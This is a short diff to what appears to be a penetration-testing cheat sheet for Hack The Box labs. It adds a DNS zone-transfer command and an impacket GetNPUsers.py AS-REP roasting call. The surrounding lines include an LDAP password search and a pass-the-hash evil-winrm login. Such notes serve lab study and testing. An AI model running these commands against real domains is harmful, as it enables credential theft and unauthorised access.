@@ -33,6 +33,12 @@ Find if an entry password exits:
 
     ldapsearch -h 10.10.10.161 -p 389 -x -b 'CN=htb,DC=local' "(sAMAccountName=*)" "*" + | grep -i password
 
+## DNS
+
+Zone transfert
+
+    # host -l domain nameserver
+
 # Cracking
 
 Identify Hash : `# hash-identifier`
@@ -155,6 +161,9 @@ Run WinRM commands from powershell:
 ## Common attacks
 
  - GetNPUsers.py (from impacket): This script will attempt to list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' set (UF_DONT_REQUIRE_PREAUTH).
+
+    # GetNPUsers.py domain/user -no-pass
+
  - Pass the hash: You can connect using the hash of the user
    * evil-winrm -i htb.local -u ADMINISTRATOR --hash 32693b11e6aa90eb43d32c72a07ceea6
  - Credentials can be saved
